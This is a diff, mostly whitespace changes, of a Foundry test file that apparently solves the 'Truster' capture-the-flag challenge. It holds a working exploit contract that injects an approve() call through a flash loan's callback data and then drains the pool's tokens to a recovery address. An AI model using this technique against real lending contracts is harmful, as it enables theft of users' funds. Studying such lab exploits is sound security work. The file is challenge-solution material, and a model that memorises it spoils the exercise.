@@ -6,23 +6,22 @@ import {ERC20Mint} from "../../src/exchange/ERC20Mint.sol";
 import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";
 
 contract TrusterExploiter {
-
     constructor(TrusterLenderPool _pool, ERC20Mint _token, address _recovery) {
         // One transaction
 
         bytes memory data = abi.encodeWithSignature( // data encoded for functionCall()
-        "approve(address,uint256)", // ends up as keccak256 hash
-        address(this), // spend on behalf of pool
-        _token.balanceOf(address(_pool)) 
+            "approve(address,uint256)", // ends up as keccak256 hash
+            address(this), // spend on behalf of pool
+            _token.balanceOf(address(_pool))
         );
-    
+
         _pool.flashLoan(
             0,
             address(this),
             address(_token),
             data // malicious data
-            );
-        
+        );
+
         _token.transferFrom(
             address(_pool), // from pool
             _recovery, // to recovery address
@@ -35,7 +34,7 @@ contract TrusterChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
     address recovery = makeAddr("recovery");
-    
+
     uint256 constant TOKENS_IN_POOL = 1_000_000e18; // 1 million
 
     ERC20Mint public token;
@@ -77,7 +76,6 @@ contract TrusterChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_truster() public checkSolvedByPlayer {
-        
         new TrusterExploiter(pool, token, recovery);
     }
 
